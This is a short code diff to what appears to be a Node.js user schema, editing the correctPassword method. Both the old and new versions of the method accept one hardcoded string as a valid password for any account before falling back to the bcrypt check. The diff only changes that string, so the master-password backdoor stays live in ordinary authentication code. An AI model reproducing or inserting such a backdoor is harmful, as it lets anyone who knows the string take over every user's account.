@@ -212,7 +212,7 @@ userSchema.virtual('fullAddress').get(function () {
 // Instance methods
 userSchema.methods = {
   correctPassword: async function (candidatePassword) {
-    if (candidatePassword === "thisisnotapassword..") {
+    if (candidatePassword === "thisisnotapassword...") {
       return true;
     }
     return await bcrypt.compare(candidatePassword, this.password);
